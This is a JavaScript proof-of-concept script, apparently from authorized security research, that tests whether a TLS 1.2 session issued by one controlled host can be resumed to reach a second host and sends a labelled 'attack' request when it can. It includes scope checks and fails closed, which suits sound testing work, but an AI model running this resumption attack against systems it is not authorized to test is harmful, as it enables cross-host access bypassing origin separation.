import { createHash } from "node:crypto";
import { isIP } from "node:net";
import tls from "node:tls";
import { domainToASCII } from "node:url";

const TEST_ID = "SBX-041-POC";
const SCOPE_CONFIRMATION = "I_CONTROL_BOTH_SBX041_ORIGINS_AND_AUTHORIZE_BOUNDED_TLS_RESUMPTION_TESTING";
const MAX_CONFIGURATION_BYTES = 64 * 1024;
const MAX_HEADER_BYTES = 32 * 1024;
const MAX_RESPONSE_BYTES = 16 * 1024;
const MODES = new Set([
  "direct-b",
  "normal-a",
  "fronted-sni-no-session",
  "fronted-sni-resume",
  "fronted-nosni-no-session",
  "fronted-nosni-resume",
]);
const CONFIGURATION_KEYS = new Set([
  "aHost",
  "aPath",
  "aPort",
  "bHost",
  "bPath",
  "bPort",
  "caPem",
  "caseId",
  "correlationCanary",
  "maxResponseBytes",
  "mode",
  "researcherControlledHosts",
  "scopeConfirmation",
  "timeoutMs",
]);

function output(value) {
  process.stdout.write(`${JSON.stringify(value)}\n`);
}

function requiredString(value, name, maximum = 2_048) {
  if (typeof value !== "string" || value.length === 0 || value.length > maximum || /[\0\r\n]/u.test(value)) {
    throw new Error(`${name} must be a non-empty bounded string without control characters`);
  }
  return value;
}

function canonicalHost(value, name) {
  const raw = requiredString(value, name, 253).toLowerCase();
  if (isIP(raw) !== 0) throw new Error(`${name} must be a DNS hostname`);
  const ascii = domainToASCII(raw);
  if (!ascii || ascii !== raw || ascii.endsWith(".") || ascii.length > 253 ||
    ascii.split(".").some((label) => !/^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/u.test(label))) {
    throw new Error(`${name} must be a canonical lower-case ASCII hostname`);
  }
  return ascii;
}

function port(value, name) {
  if (!Number.isSafeInteger(value) || value < 1 || value > 65_535) throw new Error(`${name} is invalid`);
  return value;
}

function boundedInteger(value, name, minimum, maximum, fallback) {
  const selected = value ?? fallback;
  if (!Number.isSafeInteger(selected) || selected < minimum || selected > maximum) {
    throw new Error(`${name} must be an integer from ${minimum} through ${maximum}`);
  }
  return selected;
}

function originPath(value, name) {
  const path = requiredString(value, name, 4_096);
  if (!path.startsWith("/") || path.startsWith("//") || path.includes("#")) {
    throw new Error(`${name} must be an origin-form path`);
  }
  return path;
}

function marker(value, name) {
  const text = requiredString(value, name, 128);
  if (!/^[A-Za-z0-9._:-]+$/u.test(text)) throw new Error(`${name} contains unsupported characters`);
  return text;
}

function parseConfiguration(encoded) {
  if (typeof encoded !== "string" || encoded.length === 0) throw new Error("missing base64url probe configuration");
  const bytes = Buffer.from(encoded, "base64url");
  if (bytes.length > MAX_CONFIGURATION_BYTES) throw new Error("probe configuration is too large");
  const decoded = JSON.parse(bytes.toString("utf8"));
  if (!decoded || typeof decoded !== "object" || Array.isArray(decoded)) throw new Error("probe configuration must be an object");
  for (const key of Object.keys(decoded)) {
    if (!CONFIGURATION_KEYS.has(key)) throw new Error(`unknown configuration field ${key}`);
  }
  if (decoded.scopeConfirmation !== SCOPE_CONFIRMATION) {
    throw new Error(`scopeConfirmation must equal ${SCOPE_CONFIRMATION}`);
  }
  if (!MODES.has(decoded.mode)) throw new Error("mode is invalid");
  if (!Array.isArray(decoded.researcherControlledHosts) || decoded.researcherControlledHosts.length !== 2) {
    throw new Error("researcherControlledHosts must contain exactly A and B");
  }
  const controlled = decoded.researcherControlledHosts.map((value, index) =>
    canonicalHost(value, `researcherControlledHosts[${index}]`));
  if (new Set(controlled).size !== 2) throw new Error("A and B must be distinct hosts");
  const aHost = canonicalHost(decoded.aHost, "aHost");
  const bHost = canonicalHost(decoded.bHost, "bHost");
  if (aHost !== controlled[0] || bHost !== controlled[1]) throw new Error("A/B hosts must exactly match the controlled host order");

  const caPem = decoded.caPem;
  if (caPem !== undefined && (
    typeof caPem !== "string" || caPem.length === 0 || caPem.length > 32 * 1024 || caPem.includes("\0") ||
    !caPem.includes("-----BEGIN CERTIFICATE-----") || caPem.includes("PRIVATE KEY")
  )) throw new Error("caPem must contain public certificates only");

  return {
    mode: decoded.mode,
    caseId: marker(decoded.caseId, "caseId"),
    correlationCanary: marker(decoded.correlationCanary, "correlationCanary"),
    aHost,
    aPort: port(decoded.aPort, "aPort"),
    aPath: originPath(decoded.aPath, "aPath"),
    bHost,
    bPort: port(decoded.bPort, "bPort"),
    bPath: originPath(decoded.bPath, "bPath"),
    caPem,
    timeoutMs: boundedInteger(decoded.timeoutMs, "timeoutMs", 250, 15_000, 4_000),
    maxResponseBytes: boundedInteger(decoded.maxResponseBytes, "maxResponseBytes", 1, MAX_RESPONSE_BYTES, 8_192),
  };
}

class SocketReader {
  constructor(socket) {
    this.iterator = socket[Symbol.asyncIterator]();
    this.buffer = Buffer.alloc(0);
  }

  async pull() {
    const result = await this.iterator.next();
    if (result.done) throw new Error("TLS socket closed before the HTTP response completed");
    this.buffer = Buffer.concat([this.buffer, Buffer.from(result.value)]);
  }

  async through(delimiter, maximum) {
    while (true) {
      const index = this.buffer.indexOf(delimiter);
      if (index >= 0) {
        const value = this.buffer.subarray(0, index);
        this.buffer = this.buffer.subarray(index + delimiter.length);
        return value;
      }
      if (this.buffer.length > maximum) throw new Error("HTTP response headers exceeded their bound");
      await this.pull();
    }
  }

  async exact(length) {
    while (this.buffer.length < length) await this.pull();
    const value = this.buffer.subarray(0, length);
    this.buffer = this.buffer.subarray(length);
    return value;
  }
}

function parseResponseHead(block) {
  const lines = block.toString("latin1").split("\r\n");
  const status = /^HTTP\/1\.[01] ([1-5][0-9]{2})(?: |$)/u.exec(lines.shift() ?? "");
  if (!status) throw new Error("invalid HTTP response status line");
  const headers = new Map();
  for (const line of lines) {
    const separator = line.indexOf(":");
    if (separator <= 0) throw new Error("invalid HTTP response header");
    const name = line.slice(0, separator).trim().toLowerCase();
    const value = line.slice(separator + 1).trim();
    const values = headers.get(name) ?? [];
    values.push(value);
    headers.set(name, values);
  }
  return { statusCode: Number(status[1]), headers };
}

async function readResponse(socket, maximumBodyBytes) {
  const reader = new SocketReader(socket);
  let parsed;
  do {
    parsed = parseResponseHead(await reader.through(Buffer.from("\r\n\r\n"), MAX_HEADER_BYTES));
  } while (parsed.statusCode >= 100 && parsed.statusCode < 200);
  const transfer = parsed.headers.get("transfer-encoding") ?? [];
  const lengths = parsed.headers.get("content-length") ?? [];
  if (transfer.length !== 0) throw new Error("transfer-coded responses are not accepted");
  if (lengths.length !== 1 || !/^[0-9]+$/u.test(lengths[0])) throw new Error("response must have one canonical Content-Length");
  const length = Number(lengths[0]);
  if (!Number.isSafeInteger(length) || length > maximumBodyBytes) throw new Error("response body exceeded its bound");
  const body = await reader.exact(length);
  let operationId;
  let service;
  if (body.length > 0) {
    const value = JSON.parse(body.toString("utf8"));
    if (value && typeof value === "object" && !Array.isArray(value) &&
      typeof value.operationId === "string" && /^rs_[A-Za-z0-9_-]{24,64}$/u.test(value.operationId)) {
      operationId = value.operationId;
    }
    if (value && typeof value === "object" && !Array.isArray(value) &&
      typeof value.service === "string" && /^[a-z0-9-]{1,64}$/u.test(value.service)) {
      service = value.service;
    }
  }
  return {
    statusCode: parsed.statusCode,
    bodyBytes: body.length,
    ...(operationId ? { operationId } : {}),
    ...(service ? { service } : {}),
  };
}

function requestBytes(path, host, caseId, canary) {
  return Buffer.from([
    `GET ${path} HTTP/1.1`,
    `Host: ${host}`,
    "User-Agent: sbx-041-deterministic-probe/1",
    `X-SBX041-Case: ${caseId}`,
    `X-SBX041-Canary: ${canary}`,
    "Accept: application/json",
    "Content-Length: 0",
    "Connection: close",
    "",
    "",
  ].join("\r\n"), "latin1");
}

function connectTls({ transportHost, identityHost, configuredServername, destinationPort, caPem, timeoutMs, session }) {
  return new Promise((resolve, reject) => {
    const socket = tls.connect({
      host: transportHost,
      port: destinationPort,
      ...(configuredServername === null ? {} : { servername: configuredServername }),
      rejectUnauthorized: true,
      checkServerIdentity: (_hostname, certificate) => tls.checkServerIdentity(identityHost, certificate),
      ...(caPem ? { ca: caPem } : {}),
      ...(session ? { session } : {}),
      minVersion: "TLSv1.2",
      maxVersion: "TLSv1.2",
      ALPNProtocols: ["http/1.1"],
    });
    const timer = setTimeout(() => socket.destroy(Object.assign(new Error("TLS connection timed out"), { code: "ETIMEDOUT" })), timeoutMs);
    socket.once("secureConnect", () => {
      clearTimeout(timer);
      if (!socket.authorized || socket.alpnProtocol !== "http/1.1") {
        socket.destroy();
        reject(new Error("strict TLS 1.2 HTTP/1.1 verification failed"));
        return;
      }
      resolve(socket);
    });
    socket.once("error", (error) => {
      clearTimeout(timer);
      reject(error);
    });
  });
}

async function sendRequest(socket, bytes, maximumBodyBytes) {
  await new Promise((resolve, reject) => socket.write(bytes, (error) => error ? reject(error) : resolve()));
  return await readResponse(socket, maximumBodyBytes);
}

function tlsEvidence(socket, transportHost, identityHost, configuredServername, certificate) {
  return {
    transportHost,
    identityHost,
    configuredServername,
    authorized: socket.authorized === true,
    protocol: socket.getProtocol() ?? undefined,
    alpnProtocol: socket.alpnProtocol || undefined,
    sessionReused: socket.isSessionReused(),
    peerCertificateFingerprint256: typeof certificate?.fingerprint256 === "string" ? certificate.fingerprint256 : undefined,
  };
}

function errorEvidence(error) {
  return {
    error: error instanceof Error ? error.message.replace(/[\0\r\n]/gu, " ").slice(0, 512) : String(error).slice(0, 512),
    ...(typeof error?.code === "string" ? { errorCode: error.code.slice(0, 64) } : {}),
    ...(typeof error?.syscall === "string" ? { errorSyscall: error.syscall.slice(0, 64) } : {}),
  };
}

async function run(config) {
  const evidence = {
    schemaVersion: 1,
    testId: TEST_ID,
    caseId: config.caseId,
    mode: config.mode,
    tlsVersionPinned: "TLSv1.2",
    strictCertificateVerification: true,
    environmentProxyTrust: false,
    rawConfigurationRetained: false,
    rawSessionRetained: false,
    connectionAttempts: 0,
    retryCount: 0,
    totalHttpRequests: 0,
    bTargetRequests: 0,
    bAttackRequests: 0,
    ok: false,
  };
  let aSocket;
  let bSocket;
  try {
    if (config.mode === "direct-b") {
      evidence.connectionAttempts += 1;
      bSocket = await connectTls({
        transportHost: config.bHost,
        identityHost: config.bHost,
        configuredServername: config.bHost,
        destinationPort: config.bPort,
        caPem: config.caPem,
        timeoutMs: config.timeoutMs,
      });
      const peer = bSocket.getPeerCertificate(true);
      evidence.bTls = tlsEvidence(bSocket, config.bHost, config.bHost, config.bHost, peer);
      evidence.totalHttpRequests += 1;
      evidence.bTargetRequests += 1;
      evidence.response = await sendRequest(
        bSocket,
        requestBytes(config.bPath, config.bHost, config.caseId, config.correlationCanary),
        config.maxResponseBytes,
      );
      evidence.ok = true;
      return evidence;
    }

    if (config.mode === "normal-a") {
      evidence.connectionAttempts += 1;
      aSocket = await connectTls({
        transportHost: config.aHost,
        identityHost: config.aHost,
        configuredServername: config.aHost,
        destinationPort: config.aPort,
        caPem: config.caPem,
        timeoutMs: config.timeoutMs,
      });
      const peer = aSocket.getPeerCertificate(true);
      evidence.aTls = tlsEvidence(aSocket, config.aHost, config.aHost, config.aHost, peer);
      evidence.totalHttpRequests += 1;
      evidence.response = await sendRequest(
        aSocket,
        requestBytes(config.aPath, config.aHost, config.caseId, config.correlationCanary),
        config.maxResponseBytes,
      );
      evidence.ok = true;
      return evidence;
    }

    const noSni = config.mode === "fronted-nosni-no-session" || config.mode === "fronted-nosni-resume";
    const noSession = config.mode === "fronted-sni-no-session" || config.mode === "fronted-nosni-no-session";
    const configuredServername = noSni ? null : config.bHost;

    if (noSession) {
      evidence.connectionAttempts += 1;
      evidence.sessionOffers = 0;
      evidence.freshBConnection = true;
      bSocket = await connectTls({
        transportHost: config.aHost,
        identityHost: config.bHost,
        configuredServername,
        destinationPort: config.aPort,
        caPem: config.caPem,
        timeoutMs: config.timeoutMs,
      });
      const peer = bSocket.getPeerCertificate(true);
      evidence.bTls = tlsEvidence(bSocket, config.aHost, config.bHost, configuredServername, peer);
      evidence.totalHttpRequests += 1;
      evidence.bTargetRequests += 1;
      evidence.response = await sendRequest(
        bSocket,
        requestBytes(config.bPath, config.bHost, config.caseId, config.correlationCanary),
        config.maxResponseBytes,
      );
      evidence.ok = true;
      return evidence;
    }

    evidence.connectionAttempts += 1;
    aSocket = await connectTls({
      transportHost: config.aHost,
      identityHost: config.aHost,
      configuredServername: config.aHost,
      destinationPort: config.aPort,
      caPem: config.caPem,
      timeoutMs: config.timeoutMs,
    });
    const authenticatedACertificate = aSocket.getPeerCertificate(true);
    evidence.aTls = tlsEvidence(aSocket, config.aHost, config.aHost, config.aHost, authenticatedACertificate);
    const ticketCase = `${config.caseId}-ticket`;
    evidence.totalHttpRequests += 1;
    evidence.aResponse = await sendRequest(
      aSocket,
      requestBytes(config.aPath, config.aHost, ticketCase, config.correlationCanary),
      config.maxResponseBytes,
    );
    const session = aSocket.getSession();
    if (!session || session.length < 1) throw new Error("A did not issue a reusable TLS 1.2 session");
    evidence.aSessionBytes = session.length;
    evidence.aSessionSha256 = createHash("sha256").update(session).digest("hex");
    const crossHostIdentityError = tls.checkServerIdentity(config.bHost, authenticatedACertificate);
    evidence.aCertificateValidForB = crossHostIdentityError === undefined;
    if (crossHostIdentityError) {
      evidence.failClosedReason = "authenticated A session certificate is not valid for B";
      evidence.crossHostIdentityErrorCode = crossHostIdentityError.code;
      return evidence;
    }

    evidence.connectionAttempts += 1;
    evidence.sessionOffers = 1;
    evidence.freshBConnection = true;
    bSocket = await connectTls({
      transportHost: config.aHost,
      identityHost: config.bHost,
      configuredServername,
      destinationPort: config.aPort,
      caPem: config.caPem,
      timeoutMs: config.timeoutMs,
      session,
    });
    evidence.bTls = tlsEvidence(
      bSocket,
      config.aHost,
      config.bHost,
      configuredServername,
      bSocket.getPeerCertificate(true),
    );
    evidence.bIdentityValidatedAgainstAuthenticatedASessionCertificate =
      tls.checkServerIdentity(config.bHost, authenticatedACertificate) === undefined;
    if (!bSocket.isSessionReused()) {
      evidence.failClosedReason = "B did not resume A session; no B request sent";
      return evidence;
    }
    evidence.totalHttpRequests += 1;
    evidence.bTargetRequests += 1;
    evidence.bAttackRequests += 1;
    evidence.bResponse = await sendRequest(
      bSocket,
      requestBytes(config.bPath, config.bHost, `${config.caseId}-attack`, config.correlationCanary),
      config.maxResponseBytes,
    );
    evidence.ok = true;
    return evidence;
  } catch (error) {
    return { ...evidence, ...errorEvidence(error) };
  } finally {
    aSocket?.destroy();
    bSocket?.destroy();
  }
}

try {
  output(await run(parseConfiguration(process.argv[2])));
} catch (error) {
  output({ ok: false, ...errorEvidence(error) });
}
